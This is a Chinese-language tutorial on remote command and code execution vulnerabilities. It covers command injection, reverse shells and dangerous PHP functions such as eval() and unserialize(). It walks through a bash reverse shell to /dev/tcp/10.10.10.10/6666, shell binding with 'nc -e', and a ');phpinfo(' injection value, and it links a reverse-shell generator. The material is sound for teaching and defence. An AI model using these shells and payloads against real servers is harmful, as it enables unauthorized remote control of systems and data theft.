简介

RCE是两种漏洞的简称，分别是Remote Command Exexution（远程命令执行）和Remote Code Exexution（远程代码执行），它们都是通过执行命令/代码从而远程控制服务器的一种安全漏洞。

通过该漏洞可以获取对方服务器权限、窃取机密数据、删除数据、篡改数据、作为跳板机攻击内网、当做肉鸡去攻击其他服务器。

远程命令执行

漏洞原理

攻击者注入的payload将作为操作系统命令执行。

仅当Web应用程序代码包含操作系统调用并且调用中使用了用户输入时，才可能进行OS命令注入攻击。它们不是特定于语言的，命令注入漏洞可能会出现在所有让你调用系统外壳命令的语言中：C，Java，PHP，Perl，Ruby，Python等。

反弹shell

有时候服务器执行了命令注入的命令，但是却没有回显的情况，这时候就需要启动shell服务。通过监听本地的端口，将传入的命令提交给shell执行，再返回结果。一般使用nc -e启动shell服务。

nc监听本地的6666端口，如果有外来的TCP连接就可以将外部的命令提交给bash shell进行处理。攻击者则可以使用nc进行连接。

真实场景很多服务器是有WAF等安全设备进行保护的，会屏蔽一些特殊端口，也会有一些安全策略导致无法对内部服务器进行连接。

反弹shell的思路就是，既然可以进行命令攻击，那就让处于安全环境下的服务器去连接攻击者的机器。因为防火墙的策略通常只会限制从外到内的，对于内部机器出去的流量并没有很多限制，所以攻击者必须有一台处于公网的服务器IP，能够让对方服务器连接。

nc跟反弹shell没有太多关系，攻击者可以通过nc进行监听，对方机器可以使用不同的payload的进行反弹shell。

反弹shell生成工具：https://www.iculture.cc/rce/

很多反弹shell生成的工具可以生成不同的payload。

bash下的命令：把输出、错误都返回到攻击者的服务器上。

  • bash: 启动一个 Bash shell。
  • -i: 以交互式模式运行 Bash shell。
  • >&: 将标准输出和标准错误流重定向到后面的文件描述符（FD）所指向的位置。
  • /dev/tcp/10.10.10.10/6666: 指定要连接的远程主机的 IP 地址和端口号，其中/dev/tcp` 是 Bash 的特殊设备文件之一，用于在 Bash 内部创建 TCP 连接。
  • 0>&1: 将标准输入流重定向到标准输出流。

远程代码执行

代码是泛化的命令，命令是具象的代码

几乎所有的Web语言都支持执行系统命令，远程代码执行很容易转换为远程命令执行，PHP语言是主要的受害者。

例如eval()函数就非常的危险

id是一个外部传入变量，如果传递的id参数为);phpinfo(

PHP代码就变成了,页面就会返回phpinfo成功构造了恶意代码。

下面是PHP中的危险函数，可能导致RCE的出现。

  1. eval() 函数：将字符串作为 PHP 代码进行计算并执行。如果输入的字符串来自不受信任的来源，则可能会导致代码注入攻击，使攻击者能够执行恶意代码。
  2. preg_replace() 函数：正则表达式替换函数可以传递一个模式和一个替换字符串来查找和替换匹配的文本。但是，如果使用不当，例如通过使用特殊模式组合或将用户提供的输入作为模式参数，该函数可能会导致代码注入攻击。
  3. system() 函数：执行外部命令和程序的函数。如果未正确过滤命令参数，可能会导致远程代码执行漏洞。
  4. passthru() 和 exec() 函数：类似于 system() 函数，它们也可用于调用外部命令和程序，并且也容易被利用造成远程代码执行漏洞。
  5. unserialize() 函数：将序列化字符串转换为对象或数组。但是，如果反序列化的数据来自不可信来源，则可以利用反序列化漏洞注入可执行PHP代码。
